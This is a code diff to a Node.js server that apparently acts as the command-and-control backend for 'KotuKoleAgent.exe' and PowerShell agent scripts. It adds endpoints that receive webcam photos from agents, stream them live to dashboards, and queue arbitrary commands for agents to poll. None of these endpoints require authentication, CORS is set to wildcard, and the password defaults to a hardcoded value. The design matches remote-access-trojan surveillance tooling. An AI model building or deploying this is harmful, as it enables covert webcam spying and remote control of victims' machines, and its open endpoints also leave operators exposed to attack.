@@ -4,9 +4,40 @@ const os = require('os');
 const fs = require('fs');
 const path = require('path');
 const crypto = require('crypto');
+const multer = require('multer');
 
 const PORT = process.env.PORT || 3880;
 const ACCESS_PASSWORD = process.env.LAP_PASSWORD || 'DINUJAYA';
+
+// Upload directory for webcam captures
+const uploadDir = path.join(__dirname, 'public', 'uploads');
+if (!fs.existsSync(uploadDir)) {
+    fs.mkdirSync(uploadDir, { recursive: true });
+}
+
+// Multer storage for webcam photo uploads
+const storage = multer.diskStorage({
+    destination: function (req, file, cb) {
+        cb(null, uploadDir);
+    },
+    filename: function (req, file, cb) {
+        cb(null, 'webcam-' + Date.now() + path.extname(file.originalname || '.jpg'));
+    }
+});
+const uploadWebcamMiddleware = multer({ storage: storage }).single('webcamPhoto');
+
+// SSE clients for real-time webcam & dashboard updates
+let sseClients = [];
+let agentCommandQueue = [];
+
+// Keep-alive heartbeat for SSE every 15s to prevent proxy timeouts
+setInterval(() => {
+    sseClients.forEach(client => {
+        try {
+            client.write(': heartbeat\n\n');
+        } catch(e) {}
+    });
+}, 15000);
 
 // Active auth sessions (persisted to disk across restarts)
 const sessions = new Map();
@@ -141,6 +172,97 @@ const server = http.createServer((req, res) => {
     // CORS & Security headers
     res.setHeader('X-Content-Type-Options', 'nosniff');
     res.setHeader('X-Frame-Options', 'SAMEORIGIN');
+    res.setHeader('Access-Control-Allow-Origin', '*');
+    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
+    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
+
+    if (req.method === 'OPTIONS') {
+        res.writeHead(200);
+        return res.end();
+    }
+
+    // ==========================================
+    // WEBCAM & SSE EVENT STREAM ENDPOINTS
+    // ==========================================
+
+    // SSE: Live Webcam & System Event Stream
+    if (pathname === '/api/events') {
+        res.writeHead(200, {
+            'Content-Type': 'text/event-stream',
+            'Cache-Control': 'no-cache, no-transform',
+            'Connection': 'keep-alive',
+            'X-Accel-Buffering': 'no'
+        });
+        res.write(': connected\n\n');
+        sseClients.push(res);
+        req.on('close', () => {
+            sseClients = sseClients.filter(client => client !== res);
+        });
+        return;
+    }
+
+    // Webcam Command Queue (POST /api/command)
+    if (req.method === 'POST' && pathname === '/api/command') {
+        let body = '';
+        req.on('data', chunk => body += chunk);
+        req.on('end', () => {
+            try {
+                const data = JSON.parse(body || '{}');
+                const command = data.command;
+                if (command) {
+                    agentCommandQueue.push(command);
+                    res.writeHead(200, { 'Content-Type': 'application/json' });
+                    res.end(JSON.stringify({ success: true, message: "Command queued for agent", command }));
+                } else {
+                    res.writeHead(400, { 'Content-Type': 'application/json' });
+                    res.end(JSON.stringify({ error: "No command provided" }));
+                }
+            } catch (err) {
+                res.writeHead(400, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ error: "Invalid JSON format" }));
+            }
+        });
+        return;
+    }
+
+    // Webcam Agent Polling (GET /api/poll)
+    if (req.method === 'GET' && pathname === '/api/poll') {
+        res.writeHead(200, { 'Content-Type': 'application/json' });
+        if (agentCommandQueue.length > 0) {
+            const cmd = agentCommandQueue.shift();
+            res.end(JSON.stringify({ command: cmd }));
+        } else {
+            res.end(JSON.stringify({ command: null }));
+        }
+        return;
+    }
+
+    // Webcam Photo Upload Endpoint (POST /api/upload-webcam)
+    if (req.method === 'POST' && pathname === '/api/upload-webcam') {
+        uploadWebcamMiddleware(req, res, (err) => {
+            if (err) {
+                res.writeHead(400, { 'Content-Type': 'application/json' });
+                return res.end(JSON.stringify({ success: false, error: err.message }));
+            }
+            if (!req.file) {
+                res.writeHead(400, { 'Content-Type': 'application/json' });
+                return res.end(JSON.stringify({ success: false, error: 'No webcam photo uploaded.' }));
+            }
+
+            const imageUrl = `/uploads/${req.file.filename}`;
+
+            // Notify all connected web dashboards live via SSE
+            sseClients.forEach(client => {
+                try {
+                    client.write(`data: ${JSON.stringify({ type: 'webcam_update', url: imageUrl })}\n\n`);
+                } catch(e) {}
+            });
+
+            res.writeHead(200, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({ success: true, imageUrl }));
+        });
+        return;
+    }
 
     // ==========================================
     // AGENT ENDPOINTS (Called by KotuKoleAgent.exe)
@@ -427,16 +549,51 @@ const server = http.createServer((req, res) => {
         return;
     }
 
-    // Serve Downloads / Static Files (e.g. KotuKole-Agent-Fixed.exe, KotuKoleAgent.exe)
+    // Serve Webcam UI (webcam.html)
+    if (pathname === '/webcam' || pathname === '/webcam.html') {
+        const webcamPath = path.join(__dirname, 'public', 'webcam.html');
+        if (fs.existsSync(webcamPath)) {
+            res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
+            fs.createReadStream(webcamPath).pipe(res);
+            return;
+        }
+    }
+
+    // Serve Uploaded Webcam Images (/uploads/webcam-xxx.jpg)
+    if (pathname.startsWith('/uploads/')) {
+        const imgName = path.basename(pathname);
+        const imgPath = path.join(uploadDir, imgName);
+        if (fs.existsSync(imgPath) && fs.statSync(imgPath).isFile()) {
+            const ext = path.extname(imgPath).toLowerCase();
+            const mime = ext === '.png' ? 'image/png' : 'image/jpeg';
+            res.writeHead(200, {
+                'Content-Type': mime,
+                'Cache-Control': 'public, max-age=86400'
+            });
+            fs.createReadStream(imgPath).pipe(res);
+            return;
+        }
+    }
+
+    // Serve Downloads / Static Files (e.g. agent.ps1, webcam-agent.ps1, executables)
     const requestedFile = path.basename(pathname);
     const staticFilePath = path.join(__dirname, 'public', requestedFile);
     if (fs.existsSync(staticFilePath) && fs.statSync(staticFilePath).isFile()) {
+        const ext = path.extname(staticFilePath).toLowerCase();
+        let mime = 'application/octet-stream';
+        if (ext === '.html') mime = 'text/html; charset=utf-8';
+        else if (ext === '.js') mime = 'application/javascript';
+        else if (ext === '.css') mime = 'text/css';
+        else if (ext === '.json') mime = 'application/json';
+        else if (ext === '.png') mime = 'image/png';
+        else if (ext === '.jpg' || ext === '.jpeg') mime = 'image/jpeg';
+        else if (ext === '.ps1') mime = 'text/plain; charset=utf-8';
+        else if (ext === '.bat') mime = 'text/plain; charset=utf-8';
+
         res.writeHead(200, {
-            'Content-Type': 'application/octet-stream',
-            'Content-Disposition': `attachment; filename="${requestedFile}"`,
-            'Cache-Control': 'no-store, no-cache, must-revalidate, max-age=0',
-            'Pragma': 'no-cache',
-            'Expires': '0'
+            'Content-Type': mime,
+            'Content-Disposition': (ext === '.exe' || ext === '.zip') ? `attachment; filename="${requestedFile}"` : 'inline',
+            'Cache-Control': ext === '.html' ? 'no-cache' : 'public, max-age=3600'
         });
         fs.createReadStream(staticFilePath).pipe(res);
         return;
